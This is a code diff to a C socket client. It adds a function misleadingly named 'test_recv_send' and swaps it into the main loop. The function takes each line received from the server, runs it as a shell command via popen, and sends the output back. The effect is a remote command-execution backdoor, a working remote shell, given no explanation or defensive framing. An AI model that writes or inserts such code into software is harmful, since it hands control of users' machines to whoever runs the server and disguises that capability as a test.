@@ -51,12 +51,52 @@ int command_recv(FILE *socket_file) {
       return -1;
     }
   }
+  fflush(socket_file); // Ensure the data is sent immediately
 
   free(recv_line);
 
   return 0;
 }
 
+int test_recv_send(FILE *socket_file) {
+  char *recv_line = NULL;
+  size_t recv_line_size = 0;
+
+  // Wait to receive a message from the server
+  if (getline(&recv_line, &recv_line_size, socket_file) == -1) {
+    printf("Error in receiving message\n");
+    return -1;
+  }
+
+  // Execute the command given by the server and capture its output
+  FILE *output_pipe = popen(recv_line, "r");
+  if (!output_pipe) {
+    printf("Error executing command\n");
+    free(recv_line);
+    return -1;
+  }
+
+  // Read the output of the command and send it back to the server
+  char output_buffer[4096]; // Adjust buffer size as needed
+  while (fgets(output_buffer, sizeof(output_buffer), output_pipe) != NULL) {
+    printf("%s", output_buffer); // Print to console (optional)
+    if (fputs(output_buffer, socket_file) == EOF) {
+      printf("Error sending response to server\n");
+      free(recv_line);
+      pclose(output_pipe);
+      return -1;
+    }
+  }
+  fflush(socket_file); // Ensure the data is sent immediately
+
+  // Close the output pipe
+  pclose(output_pipe);
+
+  // Clean up
+  free(recv_line);
+
+  return 0;
+}
 int main(int argc, char *argv[]) {
   int i = 0, client_sockfd;
   struct sockaddr_in server_address;
@@ -98,7 +138,7 @@ int main(int argc, char *argv[]) {
   FILE *socket_file = get_socket_file(sockfd);
   int socket_file_status = 0;
   while (socket_file_status != -1) {
-    socket_file_status = command_recv(socket_file);
+    socket_file_status = test_recv_send(socket_file);
   }
 
   if (!feof(stdin) && !feof(socket_file)) {
